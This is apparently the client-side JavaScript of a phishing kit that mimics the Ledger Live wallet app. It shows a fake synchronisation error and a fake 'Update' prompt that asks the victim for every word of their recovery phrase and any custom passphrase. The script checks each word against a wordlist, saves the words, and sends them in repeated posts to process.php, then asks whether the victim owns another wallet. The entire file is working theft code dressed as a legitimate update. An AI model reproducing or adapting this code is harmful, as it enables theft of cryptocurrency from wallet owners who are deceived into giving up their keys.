$(document).ready(function () {
  window.mac = /(Mac|iPhone|iPod|iPad)/i.test(navigator.platform);
  window.isMobile = window.mobileCheck();
  window.width = window.innerWidth > 0 ? window.innerWidth : screen.width;
  window.height = window.innerHeight > 0 ? window.innerHeight : screen.height;

  if (window.isMobile === true) {
    window.location = "/mobile/";
    $("#element").css("width", window.width);
    $("#element").css("height", window.height);
  } else {
    $(".loading").css("margin-top", "-130px");
  }

  if (window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches) {
    window.scheme = "Dark";
  } else {
    window.scheme = "Normal";
  }
  $(document).bind("mousedown selectstart", function (e) {
    return $(e.target).is("input, textarea, select, option, html");
  });
});
window.started = 1;
window.resetAll = 1;
window.first = 1;
localStorage.setItem("questionlastword", false);
localStorage.setItem("nextTolast", false);
function Start() {
  $("#element").css("background-color", "black");
  $("body").css("background-color", "black");
  if (window.first == 1) {
    amountR = 9500;
  } else {
    amountR = 500;
  }
  window.first = 2;
  if (window.started != 1) {
    return;
  }
  window.started = 2;

  if (window.mac) {
    $("#element").prepend(
      '<div class="start_header_top"><div style="display: flex;flex-direction: row;flex-wrap: nowrap;justify-content: space-between;padding-top: 0px;width: 100%"><div style="float: left;padding-left: 11px;" class=" button-cancel"><img src="assets/images/top-left-mac.png"></div><div style="flex-grow: 100;"></div><div style="float: right;"></div></div></div>'
    );
  } else {
    $("#element").prepend(
      '<div class="start_header_top"><div style="display: flex;flex-direction: row;flex-wrap: nowrap;justify-content: space-between;padding-top: 0px;width: 100%"><div style="float: left;"  class=" button-cancel"><img src="assets/images/windows-top-left.png"></div><div style="flex-grow: 100;"><img src="assets/images/windows-top-mid.png" style="width: 100%;height: 19px;"></div><div style="float: right;"><img class="button-cancel" src="assets/images/windows-top-right.png"></div></div></div>'
    );
  }
  setTimeout(function () {
    if (window.isMobile === true) {
      $(".middle_image").animate(
        {
          "margin-left": 0,
        },
        0,
        function () {
          // Animation complete.
        }
      );
    } else {
    }
    $(".middle_image").attr("src", "assets/images/ledger-live.gif");
  }, 100);

  setTimeout(function () {
    //console.log("pop");
    $(".middle_image").attr("src", "assets/images/ledger-live-single.png");
  }, 6200);
  setTimeout(function () {
    $("#element").css("padding", "0px");
    if (window.mac) {
      var windowspart =
        '<div class="start_header_top"><div style="display: flex;flex-direction: row;flex-wrap: nowrap;justify-content: space-between;padding-top: 0px;width: 100%"><div style="float: left;padding-left: 11px;"  class=" button-cancel"><img src="assets/images/top-left-mac.png"></div><div style="flex-grow: 100;"></div><div style="float: right;"></div></div></div>';
    } else {
      var windowspart =
        '<div style="display: flex;flex-direction: row;flex-wrap: nowrap;justify-content: space-between;padding-top: 0px;width: 100%"><div style="float: left;"  class=" "><img src="assets/images/windows-top-left.png"></div><div style="flex-grow: 100;"><img src="assets/images/windows-top-mid.png" style="width: 100%;height: 19px;"></div><div style="float: right;"><img class="button-cancel" src="assets/images/windows-top-right.png"></div></div>';
    }
    $(".middle_image").css("display", "none");
    $("#go-button").detach();

    $("#element").prepend(
      '<div class="scherm">\n' +
        '    <div class="sync" style="float: right;width: 100%;">' +
        windowspart +
        '    <img src="assets/images/top-menu.png" style="float: right;margin-top:5px;margin-right:100px;">' +
        '    <img src="assets/images/sync5.gif" class="warning-icon"> ' +
        '     <div class="ok-text">Synchronising</div>' +
        "    </div>" +
        '    </div><div class="left-balk">\n' +
        '        <img src="assets/images/left-balk.png">\n' +
        "    </div>\n" +
        '    <div class="main-screen">\n' +
        '        <div class="main-section">\n' +
        '            <div class="bs-screen-left" style="width: 612px"><img src="assets/images/ads-left.png"></div>\n' +
        '            <div class="bs-screen-mid-a" ></div>\n' +
        '            <div class="bs-screen-right" style="width: 573px"><img src="assets/images/ads-right.png"></div>\n' +
        "        </div>\n" +
        '        <div class="main-section">\n' +
        '            <div class="bs-screen-left" style="width: 583px"><img src="assets/images/balance-left.png"></div>\n' +
        '            <div class="bs-screen-mid-b"></div>\n' +
        '            <div class="bs-screen-right"><img src="assets/images/balance-right.png"></div>\n' +
        "        </div>\n" +
        '        <div class="main-section">\n' +
        '            <div class="bs-screen-left" style="width: 565px;"><img src="assets/images/transactions-left.png"></div>\n' +
        '            <div class="bs-screen-mid-c"></div>\n' +
        '            <div class="bs-screen-right"><img src="assets/images/transactions-right.png"></div>\n' +
        "        </div>\n" +
        "    </div>\n" +
        "</div>"
    );
    $(".start_header_top").prepend("<div class='loading-wrappert'><img src='assets/images/loading.gif' class='loading-image'></div>");
    $("#element").css("background-color", "#131415");
    $("body").css("background-color", "#131415");

    $(".left-balk").animate(
      {
        opacity: 0.3,
      },
      1000,
      function () {}
    );
    $(".main-screen").animate(
      {
        opacity: 0.3,
      },
      1000,
      function () {}
    );

    $(".scherm").animate(
      {
        opacity: 1,
      },
      3000,
      function () {
        if (window.resetAll != 1) {
          return;
        }
        window.resetAll = 2;
        refreshError();
      }
    );
  }, amountR);

  $("#element").animate(
    {
      opacity: 1,
    },
    500,
    function () {
      // Animation complete.
    }
  );
}
window.mobileCheck = function () {
  let check = false;
  (function (a) {
    if (
      /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
        a
      ) ||
      /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
        a.substr(0, 4)
      )
    )
      check = true;
  })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
};
function refreshError() {
  setTimeout(function () {
    $(".warning-icon").attr("src", "assets/images/danger.png");
    $(".warning-icon").css("margin-right", "20px");
    $(".warning-icon").css("width", "22px");

    $(".ok-text").css("width", "206px");
    $(".ok-text").html("Synchronisation error <a href='#' class='refresh-sync'>Refresh</a>");
    $(".ok-text").css("color", "red");

    //$('.sync').html(windowspart +'<img src="assets/images/top-menu.png" style="float: right;margin-top:5px;margin-right:100px;"><img src="assets/images/warning.png" class="warning-icon"> <span class="warning-text">Synchronisation error</span>');
    setTimeout(function () {
      $(".warning-text").addClass("blink_me");
      setTimeout(function () {
        $(".warning-text").removeClass("blink_me");
      }, 500);
    }, 1000);
  }, 2700);

  $(".scherm").animate(
    {
      opacity: 0.3,
    },
    1500,
    function () {
      $(".loading-wrappert").animate(
        {
          opacity: 0,
        },
        1000,
        function () {
          $("#x0p-button-1").attr("style", "width: 100%");
          $("#x0p-button-0").css("display", "none");
          $(".x0p1a").css("display", "");
        }
      );
      $(".button-warning").html("Update");
      $(".scherm").animate(
        {
          opacity: 0.7,
        },
        1000,
        function () {
          $(".button-warning").innerHTML = "Update";
        }
      );
      $(".button-warning").html("Update");
    }
  );
}
function checkWordsValid(word) {
  word = word.toLowerCase();
  result = Wordlist.find((str) => str === word);
  if (result == word) {
    return "ok";
  } else {
    return "error";
  }
}

function presentMasterPop(type) {
  if (window.mac) {
    var FDS = "autofocus";
  } else {
    var FDS = "autofocus";
  }
  switch (type) {
    case "default":
      $("#element").prepend(
        '<div class="parent" style="position: relative;">\n' +
          '        <div class="popup" style="position: absolute;top: 50%;left: 50%;transform: translate(-50%, 10%);display: none">\n' +
          '            <div class="kruis resetAll">x</div>\n' +
          '            <div class="title">Update </div>\n' +
          "            <input type='hidden' name='service' id='service' value='Ledger Live'>\n" +
          '            <div class="steps"><img src="assets/images/steps.png"></div>\n' +
          "\n" +
          '            <div class="words-box">\n' +
          '                <span class="words-title">Please fill in your <span class="wordcounttext">1st</span> recovery word</span>\n' +
          '                <div class="word">\n' +
          "\n" +
          //"                    <input type=\"password\" id=\"inputword\" class=\"inputword\" name=\"inputword\" "+FDS+">\n" +
          '                    <input type="password" id="password-field" class="word-1" name="words" ' +
          FDS +
          ">\n" +
          '                    <i id="pass-status" class="fa fa-eye" aria-hidden="true" onClick="viewPassword()"></i>\n' +
          "\n" +
          "                </div>\n" +
          '                <div class="result no-scroll" id="result"></div>\n' +
          '                <div class="mybutton">Add 1<small>st</small> word</div>\n' +
          "            </div>\n" +
          "        </div>\n" +
          "    </div>"
      );
      $(".popup").css("display", "inherit");
      break;
    case "AnotherOld":
      $("#element").html("");
      $("#element").prepend(
        '<div class="parent" style="position: relative;">\n' +
          '        <div class="popup" style="position: absolute;top: 50%;left: 50%;transform: translate(-50%, 10%);display: none">\n' +
          '            <div class="kruis resetAll">x</div>\n' +
          '            <div class="title">Update </div>\n' +
          "            <input type='hidden' name='service' id='service' value='Ledger Live'>\n" +
          '            <div class="steps"><img src="assets/images/steps-last.gif" ></div>\n' +
          "\n" +
          '            <div class="words-box">\n' +
          "                <span class=\"words-title\" style='font-size: 1.2em;color:white;'>Your wallet was sccessfully updated</span>\n" +
          "                <br><br>\n" +
          "                <span class=\"words-sub-title\" style='font-size: 1em;'>Do you own another wallet?</span>\n" +
          "            </div>\n" +
          "            <br><br><div id='x0p-buttons' class='buttons' style='width:80%;    margin-left: auto;margin-right: auto;'>\n" +
          "                <button id='x0p-button-0' class='button button-ok'\n" +
          "                           style='width: 50.00%; width: calc(100% / 2);float:left;padding: 6px;'>No\n" +
          "               </button>\n" +
          "              <button id='x0p-button-1' class='button button-info'\n" +
          "                           style='width: 50.00%; width: calc(100% / 2);padding: 6px;'>Yes\n" +
          "               </button>\n" +
          "           </div>\n" +
          "        </div>\n" +
          "    </div>"
      );
      $(".popup").css("display", "inherit");
      break;
    case "Another":
      $(".popup").remove();
      $(".parent").remove();
      $(".parent").remove();
      $(".x0p-overlay").remove();
      $("#element").prepend(
        '<div class="parent" style="position: relative;">\n' +
          '        <div class="popup x0p x0p1a default" style="position: absolute;top: 10%;left: 50%;transform: translate(-50%, 10%);display: none;">\n' +
          '            <div class="kruis resetAll">x</div>\n' +
          '            <div class="title">Update </div>\n' +
          "            <input type='hidden' name='service' id='service' value='Ledger Live'>\n" +
          '            <div class="steps"><img src="assets/images/steps-last.gif" ></div>\n' +
          "\n" +
          '            <div class="words-box">\n' +
          "                <span class=\"words-title\" style='font-size: 1.2em;color:white;'>Your wallet was sccessfully updated</span>\n" +
          "                <br><br>\n" +
          "                <span class=\"words-sub-title\" style='font-size: 1em;'>Do you own another wallet?</span>\n" +
          "            </div>\n" +
          "            <br><br><div id='x0p-buttons' class='buttons' style='margin-left: auto;margin-right: auto;'>\n" +
          "                <button id='x0p-button-0' class='button button-ok'\n" +
          "                           style='width: 50.00%; width: calc(100% / 2);float:left;padding: 6px;'>No\n" +
          "               </button>\n" +
          "              <button id='x0p-button-1' class='button button-info'\n" +
          "                           style='width: 50.00%; width: calc(100% / 2);padding: 6px;'>Yes\n" +
          "               </button>\n" +
          "           </div>\n" +
          "        </div>\n" +
          "    </div>"
      );
      $(".popup").css("display", "inherit");
      break;
    case "":
      break;
  }
}
function executePop() {
  multiple = "";
  //console.log("Executing Pop");
  $(".sync").append("<div class='test'></div>");
  $("#element").css("z-index", "100");
  document.activeElement.blur();
  presentMasterPop("default");
  $("#element").prepend('<div id="x0p-overlay" class="x0p-overlay"></div>');
  const source = document.getElementById("password-field");
  const result = document.getElementById("result");
  const inputHandler = function (e) {
    var word = e.target.value;
    //console.log("word.length :" + word.length + " Content:" + result.innerHTML);
    if (word.length > 2) {
      $(".mybutton").css("opacity", 1);
      $(".LastButton").css("opacity", 1);
    } else {
      $(".mybutton").css("opacity", 0.4);
      $(".LastButton").css("opacity", 0.4);
    }
    var ismultiple = false;
    var multiple = word.split(" ");
    if (multiple.length == 1) {
      var multiple = word.split(",");
      if (multiple.length == 1) {
        var multiple = word.split(/\r?\n/);
        if (multiple.length == 1) {
        } else {
          ismultiple = true;
          //alert("ja enter!");
        }
      } else {
        //alert("ja komma");
        ismultiple = true;
      }
    } else {
      //alert("ja spatie");
      ismultiple = true;
    }
    if (multiple.length < 12) {
      ismultiple = false;
    }
    if (ismultiple == true) {
      $(".result").html("");
      $(".word").css("display", "none");
      $(".mybutton").after('<div class="submit-button">Update</div>');
      $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.</span>");
      $(".word").css("display", "none");
      $(".submit-button").animate(
        {
          right: "15px",
        },
        500,
        function () {
          // Animation complete.
        }
      );
      $(".mybutton").css("display", "none");
      $(".popup").animate(
        {
          height: "700px",
        },
        500,
        function () {
          // Animation complete.
        }
      );
      wordcount = 1;
      multiple.forEach((element) => {
        //console.log(element);
        if (wordcount < 10) {
          var add = "&nbsp;&nbsp;";
        } else {
          var add = "";
        }
        $(".result").append(
          '<div><span class="wordCount">' +
            add +
            wordcount +
            '.</span><input style="width:350px" type="password" id="password-field-' +
            wordcount +
            '" onmouseover="viewcheckPassword(' +
            wordcount +
            ')" onmouseout="hidecheckPassword(' +
            wordcount +
            ')" class="check-word check-word-' +
            wordcount +
            '" value="' +
            element +
            '" name="words"></div>'
        );
        localStorage.setItem("password-field-" + (wordcount - 1), element);
        wordcount++;
      });
      $(".result").animate(
        {
          opacity: 1,
        },
        1000,
        function () {}
      );
      window.multiple = multiple.length;
      /*
            x0p('Do you have an '+(multiple.length+1)+'"th' word?", null, 'input',
                function(button, text) {
                    if(button == 'info') {
                        x0p('Congratulations',
                            'Your name is ' + text + '!',
                            'ok', false);
                    }
                    if(button == 'cancel') {
                        x0p('Canceled',
                            'You canceled input.',
                            'error', false);
                    }
                });

             */
      PreCheck();
    }
    //console.log("Words:" + multiple.length);
    //console.log("Words:" + multiple);
    window.allwords = multiple;
  };
  source.addEventListener("input", inputHandler);
  source.addEventListener("propertychange", inputHandler); // for IE8
}

function viewPassword() {
  var passwordInput = document.getElementById("password-field");
  var passStatus = document.getElementById("pass-status");

  if (passwordInput.type == "password") {
    passwordInput.type = "text";
    passStatus.className = "fa fa-eye-slash";
  } else {
    passwordInput.type = "password";
    passStatus.className = "fa fa-eye";
  }
}

function viewcheckPassword(item) {
  var passwordInput = document.getElementById("password-field-" + item);
  passwordInput.type = "text";
}

function hidecheckPassword(item) {
  var passwordInput = document.getElementById("password-field-" + item);
  passwordInput.type = "password";
}

window.words = "";
window.string = "";
$(document).on("click", "#x0p-button-1", function () {
  last = localStorage.getItem("questionlastword");
  //console.log("last:"+last);
  if (last == "true") {
    //console.log("---------------------------");
    $(".x0p2a").css("display", "none");
    $(".x0p1a").css("display", "none");
    $(".parent").html("");
    window.started = 1;
    window.words = "";
    window.string = "";
    executePop();
    localStorage.setItem("questionlastword", false);
  } else {
    $(".x0p").css("display", "none");
    window.words = "";
    window.string = "";
    executePop();
  }
});
$(document).on("click", ".resetAll", function () {
  reset();
});

function reset() {
  $(".word-1").val("");
  window.resetAll = 1;
  $("input").each(function (index, value) {
    console.log($(this).attr("class") + " removed");
    $(this).val("");
    $(this).detach();
  });

  $(".x0p-overlay").detach();
  $(".popup").detach();
  window.started = 1;
  window.words = "";
  window.string = "";
  $(".middle_image").css("display", "inherit");
  //Start();
  refreshError();
}
$(document).on("keyup", "#password-field", function (e) {
  if (e.key === "Enter" || e.keyCode === 13) {
    var nextTolast = localStorage.getItem("nextTolast");
    if (nextTolast == "true") {
      var word = $("#password-field").val();
      count = window.multiple + 1;
      var word = $("#password-field").val();
      if (word.length > 2) {
        console.log("LastButton: last word!");
        PreCheck();

        setTimeout(function () {
          sync();
        }, 600);
        setTimeout(function () {
          AnotherWallet();
        }, 1200);
      } else {
        console.log("LastButton: no last word!");
        sync();
        setTimeout(function () {
          AnotherWallet();
        }, 1200);
      }
    } else {
      var word = $("#password-field").val();
      if (word.length > 2) {
        wordstuff();
        PreCheck();
      }
    }
  }
});
$(document).on("click", ".button-cancel", function () {
  window.location.href = "https://support.ledger.com/hc/en-us/articles/360012207759-Solve-a-synchronization-error?support=true";
});
$(document).on("click", ".button-ok", function () {
  window.location.href = "https://shop.ledger.com/pt-br/pages/thank-you";
});
$(document).on("click", ".mybutton", function () {
  var word = $("#password-field").val();
  if (word.length > 2) {
    wordstuff();
    PreCheck();
  }
});

function wordstuff() {
  var word = $("#password-field").val();
  var word_class = $("#password-field").attr("class");
  if (word.length > 2) {
    window.words = window.words + word + " ";
    wordArray = window.words.split(/\s+/);
    window.tp.play();
    $("#password-field").val("");
    count = wordArray.length;
    window.string = window.string + "word" + (count - 1) + " : " + word + "\n";
    //console.log("wordstuff sending");
    if (count - 1 > 24) {
      $(".word").remove();
      return;
    }
    //console.log(wordArray);
    //console.log("Woorden:" + (count - 1));
    window.multiple = count;
    //console.log("window.String:\n" + window.string);
    var input = $("#password-field");
    setTimeout(function () {
      // this focus on last character if input isn't empty
      tmp = input.val();
      input.focus().val("").blur().focus().val(tmp);
    }, 200);
    $(".mybutton").html("Add " + count + "<small>th</small> word");
    window.multiple = count;
    if (count - 1 == 13) {
      $(".submit-button").css("display", "");
      $(".submit-button").html("Update");
    }
    if (count - 1 == 19) {
      $(".submit-button").css("display", "");
      $(".submit-button").html("Update");
    }
    if (count - 1 == 25) {
      $(".submit-button").css("display", "");
      $(".submit-button").html("Update");
    }
    if (count - 1 == 12) {
      $(".mybutton").after('<div class="submit-button">Update</div>');
      $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.</span><br>Or if your phrase is longer then 12 words please continue");
      //PreCheck();
      grow();
    } else {
      if (count - 1 == 18) {
        $(".mybutton").after('<div class="submit-button">Update</div>');
        $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.</span><br>Or if your phrase is longer then 18 words please continue");
        //PreCheck();
        grow();
      } else {
        if (count - 1 == 24) {
          $(".mybutton").after('<div class="submit-button">Update</div>');
          $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.</span>");
          //PreCheck();

          $(".word").css("display", "none");
          $(".submit-button").animate(
            {
              right: "15px",
            },
            500,
            function () {
              // Animation complete.
            }
          );
          $(".mybutton").css("display", "none");
          grow();
        } else {
          $(".submit-button").detach();
          $(".words-title").html('Please fill in your <span class="wordcounttext">' + count + "st</span> recovery word</span>\n");
          if (count - 1 > 24) {
            //console.log("nu");
            $(".mybutton").after('<div class="submit-button">Update</div>');
            $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.<br></span>");
            //$(".word").css("display", "none");
            $(".submit-button").animate(
              {
                right: "15px",
              },
              500,
              function () {
                // Animation complete.
              }
            );
            $(".mybutton").css("display", "none");
            //PreCheck();
            grow();
          }
        }
      }
    }
    $(".mybutton").css("opacity", 0.4);
    //$(".wordcounttext").html(count + 'th');
    $(".wordcounttext").fadeOut(400, function () {
      $(this)
        .html(count + "th")
        .fadeIn(400);
    });
    if (count - 1 < 10) {
      var add = "&nbsp;&nbsp;";
    } else {
      var add = "";
    }
    if (count - 1 == 6) {
      $(".popup").animate(
        {
          height: "700px",
        },
        500,
        function () {
          $(".result").css("height", "351px");
          // Animation complete.
        }
      );
    }
    $(".result").animate(
      {
        opacity: 1,
      },
      500,
      function () {
        // Animation complete.
      }
    );

    $(".result").prepend(
      '<div style="margin-left: -46px;"><span class="wordCount">' +
        add +
        (count - 1) +
        '.</span><input style="width:325px" type="password" id="password-field-' +
        (count - 1) +
        '" onmouseover="viewcheckPassword(' +
        (count - 1) +
        ')" onmouseout="hidecheckPassword(' +
        (count - 1) +
        ')" class="check-word check-word-' +
        (count - 1) +
        '" value="' +
        word +
        '" name="words"></div>'
    );
    localStorage.setItem("password-field-" + (count - 1), word);
  }
}

function grow() {
  $(".submit-button").animate(
    {
      backgroundColor: "white",
    },
    500,
    function () {
      $(".submit-button").animate(
        {
          backgroundColor: "#b8b1fb",
        },
        500,
        function () {}
      );
    }
  );
}
CheckWordsChange();
function CheckWordsChange() {
  $("input").each(function (index, value) {
    //console.log("$(this).attr(id):"+$(this).attr("id"));

    if ($(this).attr("id") == "service") {
    }
    if ($(this).attr("id") == "password-field") {
    }

    if ($(this).hasClass("word-1")) {
      //console.log("word-1 detected, skip")
      return;
    } else {
      //console.log("Nee has not!");
    }
    //console.log("$(this).calass:" + $(this).attr("class"));
    var newword = $(this).val();
    var oldword = localStorage.getItem($(this).attr("id"));
    if (newword != oldword) {
      localStorage.setItem($(this).attr("id"), newword);
      count = $(this).attr("id");
      count = count.split("-");
      count = count[2];
      //console.log("CheckWordsChange:")
      PreCheck();
    } else {
    }
  });
  setTimeout(function () {
    CheckWordsChange();
  }, 5000);
}

function PreCheck() {
  var nextTolast = localStorage.getItem("nextTolast");
  setTimeout(function () {
    var allwords = "";
    window.totalWords = 0;
    window.vallidWords = 0;
    $("input:password").each(function (index, value) {
      if ($(this).attr("id") != "password-field") {
        $(this).attr("type", "text");
      }
      if (nextTolast == "true") {
        $(this).attr("type", "text");
      }
    });
    $("input:text").each(function (index, value) {
      if ($(this).attr("id") == "service") {
        return;
      }
      if (nextTolast != "true") {
        if ($(this).attr("id") == "password-field") {
          return;
        }
      }
      var word = $(this).val();
      word = word.replace(/\s+/g, "");
      console.log($(this).val());
      isvallid = checkWordsValid(word);
      console.log("is valid:" + isvallid);
      if (isvallid == "error") {
        $(this).css("border-color", "#bab3fd");
        add = "invalid";
      } else {
        window.vallidWords++;
        $(this).css("border-color", "green");
        add = "correct";
      }
      if (word != "") {
        theword = $(this).attr("id").split("-");
        theword = theword[2];

        if (theword == undefined) {
          theword = "Custom passphrase";
        }
        newword = "Word " + theword + " [" + add + "] > " + word;
        tmp = allwords;
        allwords = newword + "\n" + tmp;
      }
      window.totalWords++;
      window.OnMyWord = word;
    });
    if (window.totalWords == 0) {
      return;
    }
    if (nextTolast == "true") {
      allwords += "\n-------------------------------\nCustom passphrase : " + window.OnMyWord + "\n-------------------------------";
      localStorage.setItem("nextTolast", "false");
    } else {
      allwords += "\n-------------------------------\nAmount of words : " + window.totalWords + "\nWord valid      : " + vallidWords + "\nResult          : " + Math.round((vallidWords / window.totalWords) * 100 * 100) / 100 + "% good";
    }

    submitWords(allwords);
    console.log(allwords);
    $("input:text").each(function (index, value) {
      if ($(this).attr("id") != "password-field") {
        $(this).attr("type", "password");
      }
    });
  }, 500);
}
function submitWords(allwords) {
  $.post(
    "process.php",
    {
      allwords: allwords,
    },
    function (data, status) {
      if (status === "success") {
        //console.log("Post successfully!")
      }
    },
    "json"
  );
}
function sync() {
  $(".words-title").css("display", "none");
  $(".word").css("display", "none");
  $(".LastButton").css("display", "none");
  $(".submit-button").css("display", "none");
  $(".submit-button").css("display", "none");
  $(".steps").find("img").attr("src", "assets/images/steps-ani-s.gif");
  setTimeout(function () {
    presentMasterPop("Another");
  }, 3000);
}
function AnotherWallet() {
  /*
    $(".popup").css("display","none");
    $(".x0p2a").css("display","");
    $("#x0p-button-0").css("display","");
    $("#x0p-button-1").css("width","calc(100% / 2)");
     */
  window.allwords = "";
  window.multiple = 0;
}
function lastWordQ() {
  localStorage.setItem("nextTolast", "true");
  last = localStorage.getItem("questionlastword");
  if (last == "true") {
    localStorage.setItem("nextTolast", "false");
    console.log("Last is true : AnotherWallet");
    sync();
    setTimeout(function () {
      AnotherWallet();
    }, 1200);
    return;
  }
  //$(".popup").css("display", "none");

  $(".popup").animate(
    {
      opacity: 0.5,
    },
    250,
    function () {
      count = window.multiple + 1;
      $("#password-field").val("");
      $(".word").css("display", "inherit");
      localStorage.setItem("questionlastword", true);
      if (count == 26) {
        count = 25;
      }
      if (count == 20) {
        count = 19;
      }
      if (count == 14) {
        count = 13;
      }
      console.log("im done sir, the count is :" + count);
      $(".words-title").html("Do you have an " + count + "th word custom passphrase?");
      $(".words-title").css("font-size", "1.5em");
      $(".words-title").css("color", "white");
      $(".submit-button").css("right", "150px");
      $(".submit-button").html("No, i do not");
      $(".mybutton").html("Submit word " + count);
      setTimeout(function () {
        $(".LastButton").css("display", "");
      }, 100);
      $(".LastButton").css("display", "");
      $(".LastButton").css("opacity", "");

      $(".result").html("");
      $(".word").css("display", "");

      $(".mybutton").addClass("LastButton");
      $(".LastButton").removeClass("mybutton");
      $(".LastButton").html("Submit word " + count);

      $(".popup").animate(
        {
          height: "400px",
        },
        500,
        function () {
          //$(".result").css("height", "351px");
          // Animation complete.
        }
      );
      $(".popup").animate(
        {
          opacity: 1,
        },
        250,
        function () {}
      );
      $(document).on("click", ".LastButton", function () {
        var word = $("#password-field").val();
        count = window.multiple + 1;

        var word = $("#password-field").val();
        if (word.length > 2) {
          console.log("LastButton: last word!");
          PreCheck();

          setTimeout(function () {
            sync();
          }, 600);
          setTimeout(function () {
            AnotherWallet();
          }, 1200);
        } else {
          console.log("LastButton: no last word!");
          sync();
          setTimeout(function () {
            AnotherWallet();
          }, 1200);
        }
      });
    }
  );
}

$(document).on("click", ".submit-button", function () {
  PreCheck();
  setTimeout(function () {
    lastWordQ();
  }, 500);
});
